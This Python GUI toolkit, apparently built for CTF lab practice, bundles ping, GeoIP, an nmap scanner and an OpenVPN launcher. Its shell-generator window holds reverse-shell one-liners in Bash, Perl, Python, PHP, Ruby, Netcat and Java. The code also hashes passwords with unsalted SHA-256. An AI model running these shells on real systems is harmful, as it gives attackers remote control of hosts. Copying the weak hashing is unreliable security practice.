import requests
import customtkinter as ctk
from tkinter import messagebox, LEFT
import subprocess
import sqlite3
import nmap
import os
import sys
import signal
import ctypes
from hashlib import sha256

# Hash the password using SHA-256
def hash_password(password):
    return sha256(password.encode()).hexdigest()

def is_admin():
    """ Check if the script is running with admin privileges (Windows only). """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def is_root():
    """ Check if the script is running as root (Linux only). """
    return os.geteuid() == 0

def check_permissions():
    """ Check and prompt if the script is not running with required permissions. """
    if sys.platform == "win32" and not is_admin():
        show_admin_prompt("This script needs to be run as an administrator. Please re-run it with administrative privileges.")
        sys.exit(1)
    elif sys.platform != "win32" and not is_root():
        show_admin_prompt("This script needs to be run as root. Please re-run it with root privileges.")
        sys.exit(1)

def show_admin_prompt(message):
    """ Show a message box for permission issues using customtkinter. """
    # Create a customtkinter window
    error_window = ctk.CTk()
    error_window.title("Administrator Privileges Required")
    error_window.geometry("400x200")

    # Create a label with the error message
    message_label = ctk.CTkLabel(error_window, text=message, padx=20, pady=20)
    message_label.pack(expand=True)

    # Create an OK button to close the window
    ok_button = ctk.CTkButton(error_window, text="OK", command=error_window.destroy)
    ok_button.pack(pady=10)

    # Run the customtkinter event loop for the error window
    error_window.mainloop()

def connect_vpn():
    global process
    config_file = selected_ovpn.get()

    current_directory = os.getcwd()
    config_file = current_directory + "/VPNS/" + config_file
    status_label.configure(text="Status: Connecting...")

    # Terminate any existing VPN process
    disconnect_vpn()

    # Start new VPN process
    command = f"openvpn --config {config_file}"
    process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
    status_label.configure(text="Status: Connected")

def disconnect_vpn():
    global process
    if process:
        try:
            # Terminate the process and its child processes (if any)
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            process.wait()  # Ensure the process has terminated
        except Exception as e:
            status_label.configure(text=f"Error: {e}")
        finally:
            process = None
            status_label.configure(text="Status: Disconnected")
    else:
        status_label.configure(text="Status: No VPN process to disconnect")

# VPN Window
def VPN_Window():
    global process
    # Check if the script is running with required permissions
    check_permissions()

    # Initialize the global process variable
    process = None

    # Setting up window
    ctk.set_appearance_mode("dark")  # Modes: system (default), light, dark
    ctk.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green

    VPN = ctk.CTk()

    VPN.title('VPN Window')
    VPN.geometry('600x350')

    # Create array for VPN Files
    ovpn_files = ["THM.ovpn", "THM2.ovpn", "THM3.ovpn", "Gorilla.ovpn", "HTB.ovpn", "HTB2.ovpn"]

    # Making a string on the selected .ovpn file
    global selected_ovpn
    selected_ovpn = ctk.StringVar(value=ovpn_files[0])

    # Create a dropdown menu to select VPN files
    dropdown = ctk.CTkOptionMenu(VPN, variable=selected_ovpn, values=ovpn_files)
    dropdown.pack(pady=20)

    # Create a frame to hold the buttons and status label
    button_frame = ctk.CTkFrame(VPN)
    button_frame.pack(pady=20)

    # Create buttons and add them to the frame
    connect_button = ctk.CTkButton(button_frame, text="Connect VPN", command=connect_vpn)
    connect_button.pack(side=LEFT, padx=10)

    disconnect_button = ctk.CTkButton(button_frame, text="Disconnect VPN", command=disconnect_vpn)
    disconnect_button.pack(side=LEFT, padx=10)

    # Status label
    global status_label
    status_label = ctk.CTkLabel(VPN, text="Status: Disconnected")
    status_label.pack(pady=20)

    VPN.mainloop()

# Geo IP code
def get_geoip_data(geoentry, geotextbox):
    ip = geoentry.get()
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url)
    if response.status_code == 200:
        geoip_data = response.json()
        geotextbox.delete(1.0, ctk.END)
        geotextbox.insert(ctk.END, "IP: " + geoip_data['ip'] + "\n")
        geotextbox.insert(ctk.END, "City: " + geoip_data.get('city', 'N/A') + "\n")
        geotextbox.insert(ctk.END, "Region: " + geoip_data.get('region', 'N/A') + "\n")
        geotextbox.insert(ctk.END, "Country: " + geoip_data.get('country', 'N/A') + "\n")
    else:
        geotextbox.delete(1.0, ctk.END)
        geotextbox.insert(ctk.END, "Error: Unable to retrieve Geo IP information")

# Geo IP Window
def Geo_IP():
    global geotextbox
    geoip = ctk.CTk()
    geoip.title("Geo IP")
    geoip.geometry("400x300")
    geoentry = ctk.CTkEntry(geoip, placeholder_text="Enter IP address")
    geoentry.pack(pady=10, padx=10)
    geobutton = ctk.CTkButton(geoip, text="Submit", command=lambda: get_geoip_data(geoentry, geotextbox), corner_radius=10)
    geobutton.pack(pady=10)
    geotextbox = ctk.CTkTextbox(geoip, height=15, bg_color="Black", text_color="Grey")
    geotextbox.pack(pady=10, padx=10, fill='both', expand=True)
    geoip.mainloop()

# Nmap Scanner Window
def nmap_window():
    def nmap_scan():
        ip = ip_entry.get()
        begin_port = int(begin_entry.get())
        end_port = int(end_entry.get())

        try:
            if sys.platform == "win32":
                nmap_path = r"C:\Program Files (x86)\Nmap\nmap.exe"
                if not os.path.exists(nmap_path):
                    raise FileNotFoundError("Nmap executable not found in the default installation directory.")
                scanner = nmap.PortScanner(nmap_search_path=nmap_path)
            else:
                scanner = nmap.PortScanner()
        except (nmap.PortScannerError, FileNotFoundError) as e:
            messagebox.showerror("Error", f"nmap is not installed or not found. Please install nmap and try again.\n{e}")
            return

        results_text.delete(1.0, ctk.END)

        try:
            for port in range(begin_port, end_port + 1):
                res = scanner.scan(ip, str(port))
                state = res['scan'][ip]['tcp'][port]['state']
                results_text.insert(ctk.END, f'Port {port} is {state}\n')
        except Exception as e:
            results_text.insert(ctk.END, f"Error: {e}\n")

    scanner_window = ctk.CTk()
    scanner_window.title("Nmap Scanner")
    scanner_window.geometry("600x400")

    ip_label = ctk.CTkLabel(scanner_window, text="Target IP:")
    ip_label.pack(pady=10)
    ip_entry = ctk.CTkEntry(scanner_window, placeholder_text="Enter target IP")
    ip_entry.pack(pady=10)

    begin_label = ctk.CTkLabel(scanner_window, text="Begin Port:")
    begin_label.pack(pady=10)
    begin_entry = ctk.CTkEntry(scanner_window, placeholder_text="Enter beginning port")
    begin_entry.pack(pady=10)

    end_label = ctk.CTkLabel(scanner_window, text="End Port:")
    end_label.pack(pady=10)
    end_entry = ctk.CTkEntry(scanner_window, placeholder_text="Enter ending port")
    end_entry.pack(pady=10)

    scan_button = ctk.CTkButton(scanner_window, text="Scan", command=nmap_scan)
    scan_button.pack(pady=10)

    global results_text
    results_text = ctk.CTkTextbox(scanner_window, height=20)
    results_text.pack(pady=10, padx=10, fill='both', expand=True)

    scanner_window.mainloop()

# Pinger Window
def Pinger():
    def ping_ip():
        ip = ip_entry.get()
        try:
            if sys.platform == "win32":
                result = subprocess.run(['ping', ip], capture_output=True, text=True)
            else:
                result = subprocess.run(['ping', '-c', '4', ip], capture_output=True, text=True)
            result_text.delete(1.0, ctk.END)
            result_text.insert(ctk.END, result.stdout if result.returncode == 0 else result.stderr)
        except Exception as e:
            result_text.delete(1.0, ctk.END)
            result_text.insert(ctk.END, f"Error: {e}")

    app = ctk.CTk()
    app.title("Ping Tool")
    app.geometry("400x300")

    ip_label = ctk.CTkLabel(app, text="IP Address:")
    ip_label.pack(pady=10)
    ip_entry = ctk.CTkEntry(app)
    ip_entry.pack(pady=10)
    ping_button = ctk.CTkButton(app, text="Ping", command=ping_ip)
    ping_button.pack(pady=10)
    global result_text
    result_text = ctk.CTkTextbox(app, height=15)
    result_text.pack(pady=10, padx=10, fill='both', expand=True)

    app.mainloop()

# Shell Generator Window
def Shell_Generator_Window():
    shells = ["BASH", "PERL", "Python", "PHP", "Ruby", "Netcat", "Java"]

    # Create the Shell Generator window
    shell_gen_window = ctk.CTk()
    shell_gen_window.title('Shell Generator')
    shell_gen_window.geometry('900x500')

    # Create a StringVar to hold the selected value
    selected_shell = ctk.StringVar(value=shells[0])

    # Define the callback function to update the entry
    def update_entry():
        selected_value = selected_shell.get()
        entry.delete(0, ctk.END)  # Clear current content
        if selected_value == "BASH":
            entry.insert(ctk.END, "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
        elif selected_value == "PERL":
            perl_shell = ("perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;"
                          "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                          "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                          "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                          "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
            entry.insert(ctk.END, perl_shell)
        elif selected_value == "Python":
            python_shell = (
                "python -c 'import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                "s.connect((\"10.0.0.1\",1234));"
                "os.dup2(s.fileno(), 0);"
                "os.dup2(s.fileno(), 1);"
                "os.dup2(s.fileno(), 2);"
                "subprocess.call([\"/bin/sh\", \"-i\"]);'"
            )
            entry.insert(ctk.END, python_shell)
        elif selected_value == "PHP":
            php_shell = "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            entry.insert(ctk.END, php_shell)
        elif selected_value == "Ruby":
            ruby_shell = "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            entry.insert(ctk.END, ruby_shell)
        elif selected_value == "Netcat":
            netcat_shell = "nc -e /bin/sh 10.0.0.1 1234; or rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
            entry.insert(ctk.END, netcat_shell)
        elif selected_value == "Java":
            java_shell = ("r = Runtime.getRuntime();"
                          "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;"
                          "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
                          "p.waitFor()")
            entry.insert(ctk.END, java_shell)

    # Create the dropdown menu
    dropdown = ctk.CTkOptionMenu(shell_gen_window, variable=selected_shell, values=shells, command=lambda x: update_entry())
    dropdown.pack(pady=20)

    # Create the entry widget
    entry = ctk.CTkEntry(shell_gen_window, width=900, height=500)
    entry.pack()

    # Initial update
    update_entry()

    # Run the application
    shell_gen_window.mainloop()

# Main Menu
def Main_Menu():
    login.withdraw()

    Main = ctk.CTk()
    Main.title("Main Menu")
    Main.geometry("800x600")

    Main.grid_columnconfigure(1, weight=1)
    Main.grid_rowconfigure(0, weight=1)

    side_frame = ctk.CTkFrame(Main)
    side_frame.grid(row=0, column=0, sticky="ns", padx=20, pady=20)

    ping_button = ctk.CTkButton(side_frame, text="Ping", command=Pinger)
    ping_button.pack(pady=10, padx=50)

    geo_button = ctk.CTkButton(side_frame, text="Geo IP", command=Geo_IP)
    geo_button.pack(pady=10, padx=50)

    nmap_button = ctk.CTkButton(side_frame, text="Nmap Scan", command=nmap_window)
    nmap_button.pack(pady=10, padx=50)

    vpn_button = ctk.CTkButton(side_frame, text="VPN Window", command=VPN_Window)
    vpn_button.pack(pady=10, padx=50)

    shell_gen_button = ctk.CTkButton(side_frame, text="Reverse Shell Cheatsheet", command=Shell_Generator_Window)
    shell_gen_button.pack(pady=10, padx=50)

    label = ctk.CTkLabel(Main, text="Welcome Admin", font=("Cartoon", 32))
    label.grid(row=0, column=1, padx=10, pady=20)

    Main.mainloop()

# Login function
def Login():
    Username = entry1.get()
    Password = entry2.get()
    hashed_password = hash_password(Password)

    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (Username, hashed_password))
    if cursor.fetchone():
        messagebox.showinfo("Login Successful", "You have logged in successfully!")
        Main_Menu()
    else:
        messagebox.showerror("Login Failed", "Incorrect username or password")
    conn.close()

# Initialize and set up the login window
login = ctk.CTk()
login.title("Login")
login.geometry("580x350")
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

frame = ctk.CTkFrame(login)
frame.pack(pady=20, padx=60, fill="both", expand=True)

label = ctk.CTkLabel(frame, text="Login System", font=("Cosmic", 26))
label.pack(pady=14, padx=10)

entry1 = ctk.CTkEntry(frame, placeholder_text="Username", corner_radius=10, width=180)
entry1.pack(pady=14, padx=10)
entry2 = ctk.CTkEntry(frame, placeholder_text="Password", show="*", corner_radius=10, width=180)
entry2.pack(pady=14, padx=10)

button = ctk.CTkButton(frame, text="Login", command=Login, corner_radius=10)
button.pack(pady=12, padx=10)

login.mainloop()
